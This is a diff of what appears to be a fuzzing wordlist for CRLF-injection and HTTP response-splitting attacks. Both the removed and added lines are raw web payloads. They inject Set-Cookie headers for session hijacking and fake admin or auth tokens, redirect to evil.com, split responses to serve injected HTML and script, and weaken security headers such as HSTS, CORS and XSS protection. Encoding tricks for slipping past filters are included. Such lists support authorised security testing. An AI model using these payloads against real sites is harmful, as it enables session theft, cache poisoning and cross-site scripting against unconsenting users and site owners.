@@ -1,46 +1,78 @@
+%0d%0aHeader: injected
+%0aHeader: injected
 %0d%0a
 %0a
-%0d
-\r\n
-\n
-%0D%0A
-%23%0d%0a
-%23%0a
-%3f%0d%0a
 
-/%0d%0aLocation:%20https://evil.com
-/%0d%0aLocation:https://evil.com
-/%0aLocation:%20https://evil.com
-%0d%0aLocation:%20https://evil.com
-%0aLocation:%20https://evil.com
-/redirect?url=https://evil.com%0d%0aLocation:%20https://real-evil.com
 
-/%0d%0aSet-Cookie:%20xss=<script>alert(1)</script>
-/%0d%0aSet-Cookie:xss=<script>alert(1)</script>;Path=/
-%0d%0aSet-Cookie:%20a=b;%20HttpOnly
-/%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
 
-/%0d%0aX-Forwarded-Host:%20evil.com
-/%0d%0aX-Forwarded-For:%20127.0.0.1
-/%0d%0aX-Host:%20evil.com
 
-/index.html%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>INJECTED</html>
+%0d%0aX-Injected: header
+%0aX-Injected: header
 
-?param=value%0d%0aInjected-Header:%20value
-?redirect=%0d%0aLocation:%20https://evil.com
-?next=%0d%0aLocation:%20//evil.com
+X-Injected: header
 
-User-Agent: Mozilla/5.0\r\nX-Injected: header
-Referer: https://target.com\r\nSet-Cookie: session=stolen
+X-Injected: header
+%0d%0aSet-Cookie: injected=true
+%0aSet-Cookie: injected=true
 
-%250d%250a
-%250d%250aLocation:%20https://evil.com
-%25250d%25250a
-%%0d%%0a
-%0%0d%0%0a
-%E5%98%8D%E5%98%8A (UTF-8 CRLF)
+Set-Cookie: injected=true
 
-%c4%8d%c4%8a
-%e5%98%8d%e5%98%8a
-\u000d\u000a
-\u000a
+Set-Cookie: injected=true
+%0d%0aContent-Type: text/html
+%0aContent-Type: text/html
+%0d%0aContent-Length: 0
+%0d%0a%0d%0a<html>injected</html>
+%0a%0a<html>injected</html>
+
+
+<html>injected</html>
+
+
+<html>injected</html>
+%0d%0aHTTP/1.1 200 OK
+%0aHTTP/1.1 200 OK
+%0d%0aLocation: http://evil.com/
+%0aLocation: http://evil.com/
+
+Location: http://evil.com/
+
+Location: http://evil.com/
+%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>
+%0aContent-Type: text/html%0a%0a<script>alert(1)</script>
+%0d%0aAccess-Control-Allow-Origin: *
+%0aAccess-Control-Allow-Origin: *
+%0d%0aAccess-Control-Allow-Credentials: true
+%0d%0aContent-Security-Policy: default-src 'none'
+%0d%0aX-Frame-Options: ALLOW
+%0d%0aX-XSS-Protection: 0
+%0d%0aStrict-Transport-Security: max-age=0
+%0d%0aContent-Type: application/json
+%0d%0aX-Content-Type-Options: none
+%0d%0a%0d%0a{"injected":true}
+test%0d%0aX-Injected: header
+test%0aX-Injected: header
+test
+X-Injected: header
+test
+X-Injected: header
+test%250d%250aX-Injected: header
+test%25250d%25250aX-Injected: header
+test%0d%0a%20X-Injected: header
+test%0d%09X-Injected: header
+test%0d%0aX-Injected:%20header
+test%0d%0a%09X-Injected: header
+test%E5%98%8D%E5%98%8AX-Injected: header
+test%E5%98%8AX-Injected: header
+test%c0%8dX-Injected: header
+test%c0%8aX-Injected: header
+test%u000dX-Injected: header
+test%u000aX-Injected: header
+%0d%0aFoo: bar%0d%0aBar: baz
+%0d%0aSet-Cookie: session=hijacked; HttpOnly; Secure; SameSite=None
+%0d%0aSet-Cookie: admin=true
+%0d%0aSet-Cookie: auth=FAKE_TOKEN
+test
+X-Injected: header
+testX-Injected: header
+test
+X-Injected: header
